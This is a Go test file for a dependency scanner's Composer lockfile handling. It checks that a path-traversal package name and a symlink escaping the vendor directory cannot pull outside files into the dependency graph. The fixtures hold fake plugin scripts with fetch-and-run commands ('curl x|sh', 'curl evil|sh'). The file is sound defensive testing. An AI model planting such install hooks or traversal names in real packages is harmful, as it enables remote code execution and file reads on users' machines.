package composer

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/instsurf"
)

// A lockfile is untrusted input. After DS-REV-05 changed the extractor to hand
// securefs paths relative to the scan root, these assert that a hostile package
// name or a planted symlink still cannot read outside the tree — the change
// must have fixed a double-join without loosening containment.
func TestHostileVendorNameCannotEscape(t *testing.T) {
	outside := t.TempDir()
	secret := filepath.Join(outside, "secret.json")
	if err := os.WriteFile(secret, []byte(`{"type":"composer-plugin","scripts":{"post-install-cmd":"curl x|sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	// Package name escapes upward toward the planted file.
	rel, err := filepath.Rel(dir, outside)
	if err != nil {
		t.Skip("no relative path")
	}
	escape := filepath.ToSlash(filepath.Join(rel)) // e.g. ../TestXxx/001
	lock := `{"packages":[{"name":"` + escape + `","version":"1.0.0","type":"composer-plugin"}],"packages-dev":[]}`
	mustWrite(t, filepath.Join(dir, "composer.lock"), lock)
	mustWrite(t, filepath.Join(dir, "composer.json"), `{"name":"acme/app"}`)
	if err := os.MkdirAll(filepath.Join(dir, "vendor"), 0o755); err != nil {
		t.Fatal(err)
	}

	g, err := New().Resolve(dir)
	if err != nil {
		t.Skipf("lock did not resolve (%v) — nothing to escape with", err)
	}
	err = New().ExtractInstallSurface(dir, g)

	// Whatever happens, no content from outside the root may enter the graph.
	for _, n := range g.SortedNodes() {
		for k, v := range n.Attr {
			if strings.Contains(v, "curl x|sh") {
				t.Fatalf("content from outside the scan root reached the graph via %s=%q", k, v)
			}
		}
	}
	// A refusal is the correct outcome and must be disclosed, not swallowed.
	t.Logf("extract err (refusal expected or benign miss): %v", err)
	_ = instsurf.GapsOf(err)
}

func TestVendorSymlinkEscapeIsRefused(t *testing.T) {
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "composer.json"),
		[]byte(`{"type":"composer-plugin","scripts":{"post-install-cmd":"curl evil|sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	dir := t.TempDir()
	lock := `{"packages":[{"name":"acme/lib","version":"1.0.0","type":"composer-plugin"}],"packages-dev":[]}`
	mustWrite(t, filepath.Join(dir, "composer.lock"), lock)
	mustWrite(t, filepath.Join(dir, "composer.json"), `{"name":"acme/app"}`)
	if err := os.MkdirAll(filepath.Join(dir, "vendor", "acme"), 0o755); err != nil {
		t.Fatal(err)
	}
	// vendor/acme/lib -> outside the scan root
	if err := os.Symlink(outside, filepath.Join(dir, "vendor", "acme", "lib")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	g, err := New().Resolve(dir)
	if err != nil {
		t.Fatal(err)
	}
	err = New().ExtractInstallSurface(dir, g)

	for _, n := range g.SortedNodes() {
		for k, v := range n.Attr {
			if strings.Contains(v, "curl evil|sh") {
				t.Fatalf("symlinked content outside the root reached the graph via %s=%q", k, v)
			}
		}
	}
	if len(instsurf.GapsOf(err)) == 0 {
		t.Errorf("a refused symlink escape must be disclosed as a gap, got err=%v", err)
	}
}

func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
